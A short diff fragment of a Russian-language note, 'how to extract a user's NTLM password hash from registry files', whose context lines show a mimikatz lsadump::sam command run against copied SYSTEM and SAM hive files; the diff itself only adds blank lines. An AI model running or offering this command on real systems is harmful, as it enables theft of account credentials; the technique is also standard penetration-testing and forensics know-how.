@@ -1,4 +1,7 @@
 Как извлечь хеш пароля пользователя NTLM из файлов реестра
+
+
+
 .\mimikatz.exe
 lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM
 
